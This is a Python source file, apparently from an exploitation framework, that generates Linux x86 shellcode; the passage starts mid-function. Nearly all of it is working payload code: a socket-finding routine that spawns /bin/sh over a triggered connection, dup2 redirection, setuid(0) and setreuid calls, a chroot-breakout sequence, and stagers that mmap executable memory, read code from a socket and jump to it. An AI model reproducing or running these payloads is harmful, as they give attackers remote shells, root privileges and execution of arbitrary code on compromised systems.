        popl %ebx 
        // get the to or value into %ecx
        xorl %ecx,%ecx
        movl %eax,%edx

        incl %ecx
shiftloop:
        test %edx,%edx
        jz shiftdone
        shll $1,%ecx
        decl %edx 
        jmp shiftloop

shiftdone:
        // or it into the bitmask
        orl %ecx,%ebx
        // save the internal bitmask
        pushl %ebx   
        // save the internal fd count
        pushl %eax
        
next_fd:
        // up internal count
        popl %eax
        incl %eax
        pushl %eax  
        // next fd
        incl %esi
        
        // MAX FD CHECK HERE!
        cmpl $1024,%esi
        je max_fd_reached

        // get internal count
        popl %eax
        // also get old bitmask
        popl %ebx
        cmpb $32,%al
        // do_select will jmp back to up_fd_index if we need to handle
        // a next fd segment
        je do_select
        pushl %ebx
        pushl %eax
        jmp getpeer

do_select:
        // %ebx still holds bitmask
        // check if we actually need to call select
        test %ebx,%ebx
        jz up_fd_index

        // save global fd count
        pushl %esi
        // save global fd index
        pushl %edi   
        
        // ok so we have a 32fd bitmask in %ebx
        // the actual fd will be fd in bitmask + global fd index*32
        // so on building our actual bitmask we need to prepend
        // that amount of NULL masks, %esi already holds max fd + 1

        // save esp
        movl %esp,%edx

        // build the mask
        xorl %eax,%eax
        // our actual mask
        pushl %ebx
        // get the needed prepend NULL masks
buildmask:
        test %edi,%edi
        jz finishmask 
        decl %edi
        pushl %eax
        jmp buildmask
finishmask:
        // n
        movl %esi,%ebx
        // *readfds
        movl %esp,%ecx
        // save saved esp
        pushl %edx
        // NULL
        xorl %edx,%edx
        // NULL  
        xorl %esi,%esi
        // SET SELECT TIMEOUT HERE!
        // timeout 4 secs before next segment
        // edi is already 0
        pushl %edi
        movb $4,%al
        pushl %eax
        movl %esp,%edi
        // call select(2)
        movb $142,%al
        int $0x80
        
        // restore old %esp from save
        popl %ecx
        popl %ecx   
        popl %ecx

        // restore fd count and global index
        movl (%ecx),%edi
        movl 4(%ecx),%esi  

        // restore our actual bitmask
        movl (%esp,%edi,4),%ebx

        // actually restore %esp
        movl %ecx,%esp 

        // compensate for edi and esi pushl
        popl %ecx
        popl %ecx
        
        // if return from select == 0, timeout, next segment
        // we can check here if we wish, do we wish?
        // doesn't really matter as the mask will have 0 readable fd's

        // so now we have a result mask for our segment  
        // we can calculate the actual fd via our global index
        // remember fd count starts at zero
        
        xorl %eax,%eax
        movb $32,%al

rloop:
        // this decl takes into account fd count starts at zero
        // as we initialised %eax to 32
        decl %eax
        // if we're out of fd's in the mask we go to a next segment
        cmpl $-1,%eax
        je up_fd_index
        // shift left 1, if carry set fd in eax is readable
        shll $1,%ebx
        jnc rloop

        // save bitmask
        pushl %ebx
        // save rloop index
        pushl %eax 

        // alrighty we have a readable fd
        // calculate the real fd value using
        // our index

        movl %edi,%ebx
        
calcfd:
        test %ebx,%ebx
        jz gotrealfd
        addl $32,%eax
        decl %ebx
        jmp calcfd

gotrealfd:
        // now we have our real readable fd value in %eax
        // so now we can receive a possible trigger response
        pushl $0x41414141
        movl %esp,%ecx
        xorl %edx,%edx
        // flags
        pushl %edx
        // len
        incl %edx
        pushl %edx
        // %buf
        pushl %ecx
        // s
        pushl %eax
        xorl %ebx,%ebx
        movb $10,%bl
        movl %esp,%ecx
        xorl %eax,%eax
        movb $102,%al
        int $0x80
        // anything but 1 return is failure
        cmpb $1,%al
        je checktrigger

        // failed, restore stackpointer
        addl $20,%esp
        // restore rloop index
        popl %eax   
        // restore bitmask
        popl %ebx
        jmp rloop
        
checktrigger:
        // restore fd
        popl %eax
        // eat junk from stack
        popl %ebx
        popl %ebx
        popl %ebx   
        // eat recv stack
        popl %ebx

        // check for trigger response 'O'
        cmpb $0x4f,%bl
        je foundtrigger

        // if no trigger we handle
        // the other fds in our mask

        // restore rloop index
        popl %eax
        // restore bitmask
        popl %ebx 

        jmp rloop  

foundtrigger:
        // we have a trigger! active fd is in %eax
        movl %eax,%esi
        
readexec:
        // %esi has our fd ..insert whatever the heck you wanna do to it here
        xorl %eax,%eax
        xorl %edx,%edx
        // read the first 4 bytes..len value
        movb $4,%dl
        movl %esp,%ecx
        movl %esi,%ebx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        // jmp to exit on -1
        je max_fd_reached
        movl (%esp),%edi
        // our total len is in %edi..let the games begin

        // wanna read into pcloc for non exec stack
        jmp read_here
getmyloc:
        // copy to modify
        pushl (%esp)
readexecloop:
        xorl %eax,%eax
        movl %edi,%edx
        movl (%esp),%ecx
        movb $3,%al
        int $0x80
        cmpb $0xff,%ah
        je exit
        cmpl %edi,%eax
        je execute
        subl %eax,%edi
        add %eax,(%esp)
        jmp readexecloop

execute:
        // jmp to execute .. ebx has the fd
        popl %esi
        popl %esi
        jmp *%esi

exit:
        xorl %ebx,%ebx
        xorl %eax,%eax
        incl %eax
        int $0x80

read_here:
        call getmyloc
end:
        """
        self.code += code
        return
        
    def GOFindSockWithShell(self,args):
        """
        Linux GO code NAT friendly socket recycling
        this one can search any fd range (allthough this is mostly
        limited by select itself) using fd indexing and 32 fd
        bitmask segmenting
        """
        code = """
start:
        // ignore SIGPIPE
        xorl %ecx,%ecx
        xorl %ebx,%ebx
        xorl %eax,%eax
        movb $13,%bl // SIGPIPE
        incl %ecx // SIGN_IGN
        movb $48,%al
        int $0x80

        // %edi --> global fd index
        xorl %edi,%edi
        // %esi --> global fd count
        xorl %esi,%esi

        jmp baseindex

up_fd_index:
        // indicates the next 32 fds
        incl %edi
baseindex:
        xorl %eax,%eax
        // segment bitmask
        pushl %eax
        // internal 32 range fd count
        pushl %eax

getpeer:
        // check 32 fd range
        // if AF_INET or AF_INET6, send trigger
        // and add to bitmask
        xorl %eax,%eax
        xorl %ebx,%ebx

        movb $0x10,%bl
        pushl %ebx
        // socklen_t *namelen
        movl %esp,%edx

        pushl %eax
        pushl %eax
        pushl %eax
        pushl %eax
        // struct sockaddr *name
        movl %esp,%ecx

        // push args
        pushl %edx
        pushl %ecx
        // %esi holds fd
        pushl %esi

        // args
        movl %esp,%ecx
        // getpeername
        movb $7,%bl
        // socket call
        movb $102,%al
        int $0x80
        // reset stackpointer to point to result
        addl $12,%esp
        popl %eax
        // reset stackpointer for rest junk
        addl $16,%esp
        // check for AF_INET6
        cmpb $10,%al
        je send_trigger
        // check for AF_INET
        cmpb $2,%al
        je send_trigger  

        jmp next_fd   

send_trigger:

        // 'G'
        pushl $0x47474747
        // flags
        xorl %eax,%eax
        pushl %eax
        // len
        incl %eax
        pushl %eax
        // *msg
        xorl %ecx,%ecx
        leal 8(%esp),%ecx
        pushl %ecx
        // s
        pushl %esi
        // args
        movl %esp,%ecx
        // send   
        xorl %ebx,%ebx
        movb $9,%bl
        movb $102,%al
        int $0x80
        // reset stackpointer
        addl $20,%esp
        // anything but 1 is failure
        cmpb $1,%al   
        je send_success

        jmp next_fd   

send_success:
        // get the internal fd count
        popl %eax
        // get the internal bitmask
        popl %ebx 
        // get the to or value into %ecx
        xorl %ecx,%ecx
        movl %eax,%edx

        incl %ecx
shiftloop:
        test %edx,%edx
        jz shiftdone
        shll $1,%ecx
        decl %edx 
        jmp shiftloop

shiftdone:
        // or it into the bitmask
        orl %ecx,%ebx
        // save the internal bitmask
        pushl %ebx   
        // save the internal fd count
        pushl %eax
        
next_fd:
        // up internal count
        popl %eax
        incl %eax
        pushl %eax  
        // next fd
        incl %esi
        
        // MAX FD CHECK HERE!
        cmpl $0xffff,%esi
        je max_fd_reached

        // get internal count
        popl %eax
        // also get old bitmask
        popl %ebx
        cmpb $32,%al
        // do_select will jmp back to up_fd_index if we need to handle
        // a next fd segment
        je do_select
        pushl %ebx
        pushl %eax
        jmp getpeer

do_select:
        // %ebx still holds bitmask
        // check if we actually need to call select
        test %ebx,%ebx
        jz up_fd_index

        // save global fd count
        pushl %esi
        // save global fd index
        pushl %edi   
        
        // ok so we have a 32fd bitmask in %ebx
        // the actual fd will be fd in bitmask + global fd index*32
        // so on building our actual bitmask we need to prepend
        // that amount of NULL masks, %esi already holds max fd + 1

        // save esp
        movl %esp,%edx

        // build the mask
        xorl %eax,%eax
        // our actual mask
        pushl %ebx
        // get the needed prepend NULL masks
buildmask:
        test %edi,%edi
        jz finishmask 
        decl %edi
        pushl %eax
        jmp buildmask
finishmask:
        // n
        movl %esi,%ebx
        // *readfds
        movl %esp,%ecx
        // save saved esp
        pushl %edx
        // NULL
        xorl %edx,%edx
        // NULL  
        xorl %esi,%esi
        // SET SELECT TIMEOUT HERE!
        // timeout 4 secs before next segment
        // edi is already 0
        pushl %edi
        movb $4,%al
        pushl %eax
        movl %esp,%edi
        // call select(2)
        movb $142,%al
        int $0x80
        
        // restore old %esp from save
        popl %ecx
        popl %ecx   
        popl %ecx

        // restore fd count and global index
        movl (%ecx),%edi
        movl 4(%ecx),%esi  

        // restore our actual bitmask
        movl (%esp,%edi,4),%ebx

        // actually restore %esp
        movl %ecx,%esp 

        // compensate for edi and esi pushl
        popl %ecx
        popl %ecx
        
        // if return from select == 0, timeout, next segment
        // we can check here if we wish, do we wish?
        // doesn't really matter as the mask will have 0 readable fd's

        // so now we have a result mask for our segment  
        // we can calculate the actual fd via our global index
        // remember fd count starts at zero
        
        xorl %eax,%eax
        movb $32,%al

rloop:
        // this decl takes into account fd count starts at zero
        // as we initialised %eax to 32
        decl %eax
        // if we're out of fd's in the mask we go to a next segment
        cmpl $-1,%eax
        je up_fd_index
        // shift left 1, if carry set fd in eax is readable
        shll $1,%ebx
        jnc rloop

        // save bitmask
        pushl %ebx
        // save rloop index
        pushl %eax 

        // alrighty we have a readable fd
        // calculate the real fd value using
        // our index

        movl %edi,%ebx
        
calcfd:
        test %ebx,%ebx
        jz gotrealfd
        addl $32,%eax
        decl %ebx
        jmp calcfd

gotrealfd:
        // now we have our real readable fd value in %eax
        // so now we can receive a possible trigger response
        pushl $0x41414141
        movl %esp,%ecx
        xorl %edx,%edx
        // flags
        pushl %edx
        // len
        incl %edx
        pushl %edx
        // %buf
        pushl %ecx
        // s
        pushl %eax
        xorl %ebx,%ebx
        movb $10,%bl
        movl %esp,%ecx
        xorl %eax,%eax
        movb $102,%al
        int $0x80
        // anything but 1 return is failure
        cmpb $1,%al
        je checktrigger

        // failed, restore stackpointer
        addl $20,%esp
        // restore rloop index
        popl %eax   
        // restore bitmask
        popl %ebx
        jmp rloop
        
checktrigger:
        // restore fd
        popl %eax
        // eat junk from stack
        popl %ebx
        popl %ebx
        popl %ebx   
        // eat recv stack
        popl %ebx

        // check for trigger response 'O'
        cmpb $0x4f,%bl
        je foundtrigger

        // if no trigger we handle
        // the other fds in our mask

        // restore rloop index
        popl %eax
        // restore bitmask
        popl %ebx 

        jmp rloop  

foundtrigger:
        // we have a trigger! active fd is in %eax
        movl %eax,%esi
        
        // dup2 0,1,2 from fd
        movl %eax,%ebx
        xorl %ecx,%ecx
dup2:
        xorl %eax,%eax
        movb $63,%al
        int $0x80
        incl %ecx
        cmpb $3,%cl
        jne dup2

        // execve /bin/sh
        xorl %eax,%eax
        pushl %eax
        pushl $0x68732f2f
        pushl $0x6e69622f
        movl %esp,%ebx
        pushl %eax
        pushl %ebx
        movl %esp,%ecx
        xorl %edx,%edx
        movb $11,%al
        int $0x80

max_fd_reached:
        // exit(0)  
        xorl %ebx,%ebx
        xorl %eax,%eax
        incl %eax
        int $0x80
end:
        """
        self.code += code
        bin=mosdef.assemble(code, "X86")
        # this code is mostly used standalone
        self.value += bin
        return
    
    def getdup2ebx(self,fd):
        template="""
        xorl %eax,%eax
        xorl %ecx,%ecx
        movb $FD, %cl
        movb $0x3f,%al
        int $0x80
        """
        code = template.replace("FD","%d"%fd)
        self.code += code
        return
    
    def dup2(self,args):
        """Requires ebx to be the socket handle 
        calls dup2() to set 0,1,2 to that socket
        """
        
        # learned from rsync experience :D
        if args==None:
            print "failed to dup2, no arguments (fd must be given)"
            return
        fd=args[0]
        code="""
        movl $FD,%ebx
        """
        code = code.replace("FD", "%d" % fd)
        self.code += code
        self.getdup2ebx(0)
        self.getdup2ebx(1)
        self.getdup2ebx(2) # these add to self.code
        return
        
    def setuid(self,args):
        """Calls setuid(id) """
        code="""
        pushl %ebx
        xorl %eax,%eax 
        """
        if args==None:
            id=0
        else:
            id=args[0]
        if id==0:
            code+="""
        xorl %ebx, %ebx
            """
        else:
            code+="""
        movl $ID,%ebx
            """
            code=code.replace("ID","%d"%id)
        code+="""
        movb $0x17,%al
        int $0x80
        popl %ebx
        """
        self.code += code
        return
    
    def setreuid(self,args):
        """Calls setreuid(id,id2) """
        code="""
        pushl %ebx
        pushl %ecx
        xorl %eax,%eax 
        """
        if args==None:
            id1=0
            id2=0
        else:
            id1=args[0]
            id2=args[1]
        if id1==0:
            code+="""
        xorl %ebx, %ebx
            """
        else:
            code+="""
        movl $ID1,%ebx
            """
        if id2==0:
            code+="""
        xorl %ecx, %ecx
            """
        else:
            code+="""
        movl $ID2,%ecx
            """
        code+="""
        movb $0x46,%al
        int $0x80
        popl %ecx
        popl %ebx
        """
        #replace the id and id1 if necessary
        code = code.replace("ID1",str(id1)).replace("ID2",str(id2))
        self.code += code
        return
    
    def execve(self,args):
        """
        We could shorten this down even further by allocating space
        on the stack for our pointer tables, instead of including it
        in the shellcode.
        
        If env and args are [] we could do some optimization as well.
        """
        
        filename=args["filename"]
        argv=args["argv"] #list of args
        envp=args["envp"] #list of environment variables
        suffix=""
        code="""
        push %ebx //we destroy this and every other register. Bad us.
        call geteip
geteip:
        pop %ebx
        leal environmentpointers-geteip(%ebx),%edi
        """
        asciinum=0
        pointertable=""
        pointertable+="\nenvironmentpointers:\n"
        for env in envp:
            code+="leal ascii%d-geteip(%%ebx),%%eax"%asciinum
            code+="""            
        movl %eax,(%edi)
        addl $4,%edi
            """
            suffix+="ascii%d:\n"%asciinum
            suffix+=".ascii \"%s\"\n"%env
            suffix+=".byte 0x00\n"
            pointertable+=".long 0x00000000\n"
            asciinum+=1

        #null terminate the env pointer array
        code+="""
        //movl $0,%eax
        //movl %eax,(%edi)
        add $4,%edi
        """
        pointertable+=".long 0x00000000\n"
        
        #load the argv
        code+="""
        leal argpointers-geteip(%ebx), %edi
            """
        pointertable+="argpointers:\n"        
        for arg in argv:
            code+="leal ascii%d-geteip(%%ebx),%%eax"%asciinum
            code+="""            
        movl %eax,(%edi)
        addl $4,%edi
            """
            suffix+="ascii%d:\n"%asciinum
            suffix+=".ascii \"%s\"\n"%arg
            suffix+=".byte 0x00\n"
            pointertable+=".long 0x00000000\n"
            asciinum+=1    
            
        #null terminate the arg pointer array
        code+="""
        //movl $0,%eax
        //movl %eax,(%edi)
        """
        pointertable+=".long 0x00000000\n"
        
        #add filename to suffix
        suffix+="filename:\n.ascii \"%s\"\n"%filename
        suffix+="\n.byte 0x00\n" #null terminator
        
        code+="""
        leal environmentpointers-geteip(%ebx),%edx
        leal argpointers-geteip(%ebx), %ecx
        leal filename-geteip(%ebx), %ebx
        movl $0x0b,%eax //0b is execve - we can make this a variable later.
        int $0x80
        jmp done
            """
        code+=pointertable+suffix
        code+="""
done:
                """
        #print "code=%s"%code
        self.code += code
        return
    
    def send_universal(self, args):
        """
        Sends over the universal type and id to the remote side in network byte order
        """
        mosdef_type=args["mosdef_type"]
        mosdef_id=args["mosdef_id"]
        code="""
        pushl %FDREG
        pushl $MOSDEF_ID
        pushl $MOSDEF_TYPE
        xorl %eax,%eax
        pushl %eax //flags of zero
        movb $8,%al
        pushl %eax //length of 8
        leal 8(%esp),%ecx
        pushl %ecx //message 
        pushl %FDREG
        xorl %ecx,%ecx
        movl %esp,%ecx
        xorl %ebx,%ebx
        movb $9,%bl
        movb $102,%al // send(2)
        int $0x80 // send the register to fd
        addl $24,%esp //reset stack pointer
        popl %FDREG
        """
        #really should be using a sendloop, but we're not since we're only sending 8 bytes...
        code=code.replace("MOSDEF_TYPE",str(reverseword(mosdef_type)))
        code=code.replace("MOSDEF_ID",str(reverseword(mosdef_id)))
        
        code=code.replace("FDREG",args["fdreg"])
        self.code += code 
        return
    
    def sendreg(self,args):
        """
        Calls send() to send 4 bytes of reg value in little
        endian order to the socket which is in args["fdreg"]
        args[regtosend] and args[fdreg] cannot be eax, ecx
        ESP would also be nonesense in this context
        
        After this is finished, it leaves the fd in FDREG
        
        This code is specific to Linux, x86
        
        """
        code="""
        pushl %FDREG
        pushl %REGTOSEND
        xorl %eax,%eax
        pushl %eax //flags of zero
        movb $4,%al
        pushl %eax //length of 4
        leal 8(%esp),%ecx
        pushl %ecx //message 
        pushl %FDREG
        xorl %ecx,%ecx
        movl %esp,%ecx
        xorl %ebx,%ebx
        movb $9,%bl
        movb $102,%al // send(2)
        int $0x80 // send the register to fd
        addl $20,%esp //reset stack pointer
        popl %FDREG
        """
        code=code.replace("REGTOSEND",args["regtosend"])
        code=code.replace("FDREG",args["fdreg"])
        self.code += code 
        return
    
    def chroot(self, args):
        """
        TODO:
            - Need optimization (probably change the whole shellcode, cause i suck)
        """
        code = """
        // mkdir o..
        xorl %eax,%eax
        // nul terminate
        pushl %eax
        pushl $0x2E2E6F6F
        movl %esp,%ebx
        // point to o..
        incl %ebx
        pushl %ebx
        xorl %ecx,%ecx
        movb $39,%al
        int $0x80

        // chroot(o..)
        popl %ebx
        pushl %ebx
        xorl %eax,%eax
        movb $61,%al
        int $0x80

        // loop chdir(..)
        popl %ebx
        // point to ..
        incl %ebx
        pushl %ebx
        xorl %ecx,%ecx
        movb $255,%cl

chdir_loop:

        popl %ebx
        pushl %ebx
        xorl %eax,%eax
        movb $12,%al
        int $0x80

        loop chdir_loop

        // chroot(.)

        popl %ebx 
        // point to .
        incl %ebx
        xorl %eax,%eax
        movb $61,%al
        int $0x80
        """
        self.code += code
        return
        
    def read_and_exec(self,args):
        """
        Reads in a little endian word of data, then reads in that much shellcode
        then jumps to it

        requires the register that has the socket handle in it to be args["fdreg"] 
        """
        
        code = "readexec:\n"
        
        if args["fdreg"] != "esi":
            code += """
            mov %FDREG,%esi
            """
        
        code += """
    pushl %esi
    
recv_len_mosdef:
    pushl %eax
    movl %esp,%edi
    
    xorl %eax,%eax
    pushl %eax
    pushl $4
    pushl %edi    
    pushl %esi
    movl %esp,%ecx
    xorl %ebx,%ebx
    movb $10,%bl
    movb $102,%al
    int $0x80
    // needs error check
    
    addl $16,%esp
    popl %ecx
    popl %esi
    pushl %esi
    pushl %ecx
    
mmap_mosdef:
    xorl %eax,%eax
    pushl %eax
    pushl $-1
    pushl $0x22
    pushl $0x7
    pushl %ecx
    pushl %eax
    movl %esp,%ebx
    movb $90,%al
    int $0x80

    addl $24,%esp
    movl %eax,%edi
    
    popl %ecx
    popl %esi
    pushl %esi
    pushl %edi
    pushl %ecx
    pushl %edi
    
read_main_mosdef:
    pushl %esi
    pushl %ecx
    pushl %edi
    xorl %eax,%eax
    popl %ecx // dst
    popl %edx // len
    pushl %edx
    pushl %ecx
    movl %esi,%ebx
    movb $3,%al
    int $0x80
    
    test %eax,%eax
    jle exit_mosdef
    popl %edi
    popl %ecx
    popl %esi
    addl %eax,%edi
    subl %eax,%ecx
    test %ecx,%ecx
    jnz read_main_mosdef
    
exec_main_mosdef:
    popl %edi
    pushl %edi

    movl %esi,%ebx
    call *%edi

exit_mosdef:
    xorl %eax,%eax
    incl %eax
    int $0x80
        """
        code = code.replace("FDREG", args["fdreg"])
        self.code += code
        return
    
    def read_and_exec_loop(self, args):
        """
        Reads in a little endian word of data, then reads in that much shellcode
        then CALLS it
        
        Shellcode needs to call "ret" when it is done

        requires the FD of the socket handle in it to be args["fd"]
        
        This is basically the core of MOSDEF!
        """
        
        code = """
recv_len_mosdef_loop:
    pushl %eax
    movl %esp,%edi
    
recv_eagain:

    xorl %eax,%eax
    pushl %eax
    pushl $4
    pushl %edi    
    pushl $FD
    movl %esp,%ecx
    xorl %ebx,%ebx
    movb $10,%bl
    movb $102,%al
    int $0x80
    cmpl $0,%eax
    
    jg no_error

    cmpl $-11,%eax
    je recv_eagain

    jmp exit_mosdef_loop
    
no_error:

    addl $16,%esp
    popl %ecx
    pushl %ecx
    
mmap_mosdef_loop:
    xorl %eax,%eax
    pushl %eax
    pushl $-1
    pushl $0x22
    pushl $0x7
    pushl %ecx
    pushl %eax
    movl %esp,%ebx
    movb $90,%al
    int $0x80

    addl $24,%esp
    movl %eax,%edi
    
    popl %ecx
    pushl %edi
    pushl %ecx
    pushl %edi

read_main_mosdef_loop:
    pushl %ecx
    pushl %edi
    xorl %eax,%eax
    popl %ecx // dst
    popl %edx // len
    pushl %edx
    pushl %ecx
    movl $FD,%ebx
    movb $3,%al
    int $0x80
    test %eax,%eax
    jle exit_mosdef_loop
    popl %edi
    popl %ecx
    addl %eax,%edi
    subl %eax,%ecx
    test %ecx,%ecx
    jnz read_main_mosdef_loop
    
exec_main_mosdef_loop:
    popl %edi
    pushl %edi

    call *%edi

munmap_main_mosdef_loop:
    // %esp is already pointing at (start/edi, len/ecx)
    popl %ebx
    popl %ecx
    xorl %eax,%eax
    movb $91,%al
    int $0x80
    
    jmp recv_len_mosdef_loop

exit_mosdef_loop:
    xorl %eax,%eax
    incl %eax
    int $0x80
        """
        code = code.replace("FD",str(args["fd"]))
        self.code += code
        return

if __name__ == '__main__':
    sc   = linux_X86()
    sc.GOFindSock({})
    print sc.code
